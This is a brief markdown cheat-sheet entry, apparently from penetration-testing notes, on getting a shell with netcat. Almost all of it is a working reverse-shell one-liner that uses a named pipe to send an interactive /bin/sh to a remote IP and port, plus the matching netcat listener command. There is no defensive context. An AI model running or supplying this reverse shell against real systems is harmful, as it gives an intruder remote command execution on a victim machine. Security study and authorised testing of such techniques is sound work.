# Shells

## Netcat (nc)  

Some version of netcat do not have the `-e` switch avaiable.  On these you can pipe the commands into netcat.  

Server:
```
rm -f /tmp/f; mkfifo /tmp/f
cat /tmp/f | /bin/sh -i 2>&1 | nc IP PORT  > /tmp/f
```
Client:  
`nc -lvp PORT`
